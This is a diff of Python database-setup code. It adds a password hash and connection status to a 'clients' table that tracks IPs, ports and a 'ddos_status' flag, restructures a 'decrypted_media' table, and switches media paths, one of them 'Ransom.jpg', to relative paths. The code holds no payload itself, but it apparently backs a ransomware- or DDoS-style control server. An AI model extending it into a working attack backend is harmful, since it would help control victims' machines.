@@ -1,3 +1,4 @@
+import os
 from db_manager import DatabaseManager
 
 def create_all_tables(db_manager):
@@ -7,32 +8,51 @@ def create_all_tables(db_manager):
     Args:
         db_manager: An initialized DatabaseManager instance
     """
+    # טבלת לקוחות כוללת שם משתמש, סיסמה מוצפנת וסטטוס חיבור
     db_manager.create_table(
         "clients",
-        "(client_id INT PRIMARY KEY, client_ip VARCHAR(255), client_port INT, last_seen DATETIME, ddos_status BOOLEAN, total_sent_media INT)"
+        "(client_id VARCHAR(255) PRIMARY KEY, "
+        "password_hash VARCHAR(256) NOT NULL, "
+        "client_ip VARCHAR(50), "
+        "client_port INT, "
+        "last_seen DATETIME, "
+        "ddos_status BOOLEAN DEFAULT FALSE, "
+        "total_sent_media INT DEFAULT 0, "
+        "is_connected BOOLEAN DEFAULT FALSE)"
     )
     
+    # טבלת מדיה מפוענחת
     db_manager.create_table(
         "decrypted_media",
-        "(user_id VARCHAR(255), media_type_id INT, path_to_decrypted_media VARCHAR(255))"
+        "(id INT AUTO_INCREMENT PRIMARY KEY, "
+        "user_id VARCHAR(255), "
+        "media_type_id INT, "
+        "path_to_decrypted_media VARCHAR(255))"
     )
     
+    # טבלת תפריט מדיה
     db_manager.create_table(
         "media_menu",
-        "(id_media INT PRIMARY KEY, image_path VARCHAR(255), audio_path VARCHAR(255), video_path VARCHAR(255))"
+        "(id_media INT PRIMARY KEY, "
+        "image_path VARCHAR(255), "
+        "audio_path VARCHAR(255), "
+        "video_path VARCHAR(255))"
     )
 
 def populate_media_menu(db_manager):
     """
-    Populate the media_menu table with predefined data if it's empty.
+    Populate the media_menu table with predefined data using relative paths.
     
     Args:
         db_manager: An initialized DatabaseManager instance
     """
+    # שימוש בנתיבים יחסיים במקום נתיבים קשיחים במחשב ספציפי
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    
     predefined_media = [
-        (1, r"C:\Users\Mamriot_User\Desktop\secret_service_project\JPG\Ransom.jpg", None, None),
-        (2, r"C:\Users\Mamriot_User\Desktop\secret_service_project\JPG\cover1_image.jpg", None, None),
-        (3, None, None, r"C:\Users\Mamriot_User\Desktop\secret_service_project\MP4\video.mp4")
+        (1, os.path.join("JPG", "Ransom.jpg"), None, None),
+        (2, os.path.join("JPG", "cover1_image.jpg"), None, None),
+        (3, None, None, os.path.join("MP4", "video.mp4"))
     ]
 
     existing_rows = db_manager.get_all_rows("media_menu")
@@ -44,3 +64,4 @@ def populate_media_menu(db_manager):
                 "(%s, %s, %s, %s)",
                 media
             )
+        print("Media menu populated successfully.")
